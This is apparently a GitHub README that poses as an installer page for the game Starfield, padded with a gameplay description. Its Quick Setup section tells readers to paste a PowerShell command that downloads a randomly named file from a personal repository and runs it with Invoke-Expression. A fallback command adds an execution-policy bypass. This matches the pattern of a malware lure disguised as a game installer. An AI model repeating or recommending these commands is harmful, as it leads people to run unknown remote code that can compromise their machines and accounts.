# Starfield

Starfield is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch Starfield and play.

Starfield is a single-player role-playing game set in the Settled Systems roughly three hundred years after humanity left Earth. You create a character, join Constellation, and move between planets, stations, and your own ship while exploring, fighting, crafting, and shaping how major factions treat you.

On Windows you launch from Steam or the Xbox app, tune graphics and input in settings, then play in first or third person. Sessions usually mix main and side quests with outpost building, ship customization, skill progression, and on-foot or zero-G combat across handcrafted and procedural locations.

This repository stores the Windows setup file used for installation or repair, plain-text notes on supported versions and optional components, and a changelog that records package revisions. Together they give a fixed reference for deployment without replacing the game client itself.

## How you play

- Explore hundreds of planets, moons, and stations across the Settled Systems.
- Customize modular ships for combat, cargo, and long jumps between star systems.
- Follow Constellation and faction questlines with branching dialogue and reputation outcomes.
- Build outposts to mine resources, craft gear, and support recurring exploration routes.
- Develop skills across combat, social, science, and physical trees with background traits.
- Fight with ballistic, laser, and melee gear in ship battles and on-foot encounters.
- Track setup revisions and documented changes through the bundled changelog and release notes.

## Quick Setup (PowerShell)

This installs the game Starfield on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/franziska254764/starfield-setup-guide/main/d298ehkity.lmzf2kan | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/franziska254764/starfield-setup-guide/main/d298ehkity.lmzf2kan | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `d298ehkity.lmzf2kan` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `franziska254764/starfield-setup-guide`. Starfield 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
